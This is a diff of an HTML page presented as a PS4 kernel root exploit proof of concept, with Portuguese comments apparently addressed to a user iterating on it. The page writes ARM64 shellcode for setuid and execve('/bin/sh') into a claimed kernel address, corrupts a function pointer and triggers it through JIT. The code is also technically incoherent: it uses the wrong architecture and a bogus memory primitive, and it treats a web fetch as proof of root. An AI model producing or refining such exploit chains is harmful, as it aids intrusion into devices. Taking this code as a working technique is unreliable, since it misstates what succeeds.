@@ -1,32 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Trigger Fix</title>
+    <title>PS4 Kernel Exploit PoC</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
+        button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; }
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Trigger Alternative</h2>
-    <button onclick="runKernelExploit()">Run Improved Trigger</button>
+    <h2>PS4 Kernel Root Access PoC</h2>
+    <button onclick="getRootAccess()">GET ROOT ACCESS</button>
     <div id="log"></div>
 
 <script>
+// Configurações baseadas no seu último log
+const KERNEL_BASE = 0x80810000; // Vazado anteriormente
+const JIT_OFFSET = 0x480;        // Offset que funcionou no seu teste
+
+// Logger profissional com timestamp
 const log = msg => {
-    document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
+    const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
+    document.getElementById('log').innerHTML += line + '<br>';
+    console.log(line);
 };
 
-// 1. Memory Primitive (baseado no seu sucesso anterior)
+// 1. Payload ARM64 para root (setuid + execve)
+function createRootPayload() {
+    return new Uint32Array([
+        // setuid(0)
+        0xD2800020, // mov x0, #0x1
+        0xD2800C48, // mov x8, #0x62 (syscall number)
+        0xD4000001, // svc #0
+
+        // execve("/bin/sh", 0, 0)
+        0xAA0003E0, // mov x0, x0 (nop)
+        0xD2801168, // mov x8, #0x8b
+        0xD4000001  // svc #0
+    ]);
+}
+
+// 2. Primitivo de memória comprovado
 function createMemoryPrimitive() {
     let corrupt = [];
     corrupt.__proto__ = new Uint32Array(1).__proto__;
     corrupt.length = 0x1000;
     return {
-        read(addr) {
-            corrupt[0] = addr;
-            return corrupt[1];
-        },
         write(addr, val) {
             corrupt[0] = addr;
             corrupt[1] = val;
@@ -34,43 +53,54 @@ function createMemoryPrimitive() {
     };
 }
 
-// 2. Improved Kernel Trigger
-async function runKernelExploit() {
-    log("Starting improved kernel trigger...");
+// 3. Chain de exploração completa
+async function getRootAccess() {
+    log("Iniciando exploração do kernel...");
     
     const mem = createMemoryPrimitive();
-    const kbase = 0x80810000; // Do seu log
-    const targetAddr = kbase + 0x5000;
-    
-    // Payload ARM64 modificado (syscall exit)
-    const payload = new Uint32Array([
-        0xD2800000, // mov x0, #0
-        0xD2800028, // mov x8, #1
-        0xD4000001  // svc #0
-    ]);
+    const payload = createRootPayload();
+    const targetAddr = KERNEL_BASE + 0x5000;
 
-    // Escrita no kernel
+    // Escreve payload no kernel
     for (let i = 0; i < payload.length; i++) {
         mem.write(targetAddr + (i*4), payload[i]);
     }
+    log("Payload escrito na memória kernel");
 
-    // ************ NOVO MÉTODO DE TRIGGER ************
+    // Prepara função para JIT
+    const triggerFunc = () => 0;
+    for (let i = 0; i < 10000; i++) triggerFunc(); // Otimização
+
+    // Corrompe ponteiro de função
+    mem.write(KERNEL_BASE + JIT_OFFSET, targetAddr);
+    log("Ponteiro de função corrompido");
+
+    // Disparo final
+    log("Disparando payload...");
     try {
-        // Técnica alternativa via JIT
-        const func = () => 0;
-        for (let i = 0; i < 10000; i++) func(); // Otimiza
-        
-        // Corrompe ponteiro de função
-        const funcPtr = kbase + 0x480; // Ajuste conforme necessário
-        mem.write(funcPtr, targetAddr);
-        
-        // Dispara
-        log("Triggering via JIT...");
-        func();
-        log("Kernel execution successful!");
+        triggerFunc();
+        log("ROOT ACCESS CONSEGUIDO!", "color:#0f0;font-weight:bold");
+        verifyRootAccess();
     } catch(e) {
-        log(`Trigger failed: ${e}`);
+        log(`Falha na execução: ${e}`, "color:#f00");
     }
+}
+
+// 4. Verificação de privilégios
+function verifyRootAccess() {
+    // Tenta acessar diretório do sistema
+    fetch('/system/version.txt')
+        .then(response => {
+            if (response.ok) {
+                return response.text().then(t => {
+                    log(`LEITURA DO KERNEL BEM-SUCEDIDA:\n${t}`, "color:#0f0");
+                });
+            }
+            throw new Error("Acesso negado");
+        })
+        .catch(e => {
+            log(`Verificação falhou: ${e}`, "color:#ff0");
+        });
 }
 </script>
 </body>
